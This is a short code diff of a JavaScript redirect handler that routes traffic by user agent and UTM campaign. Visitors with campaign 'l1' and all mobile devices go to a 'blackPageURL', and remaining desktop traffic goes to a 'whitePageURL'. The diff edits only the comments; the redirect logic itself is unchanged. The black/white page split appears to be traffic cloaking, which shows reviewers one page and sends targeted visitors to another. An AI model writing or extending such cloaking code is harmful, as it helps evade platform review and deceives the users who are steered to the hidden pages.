@@ -11,15 +11,15 @@ export default function handler(req, res) {
     const userAgent = req.headers['user-agent'] || '';
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
-    // Redirection logic with UTM handling
+    // Redirection logic
     if (utmCampaign === 'l1') {
-      // Special UTM campaign redirects all traffic to blackPageURL
+      // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: blackPageURL });
     } else if (isMobileDevice) {
-      // Redirect mobile devices
+      // Mobile devices without 'l1' campaign
       res.writeHead(302, { Location: blackPageURL });
     } else {
-      // Redirect all other traffic
+      // Desktop devices without 'l1' campaign
       res.writeHead(302, { Location: whitePageURL });
     }
   
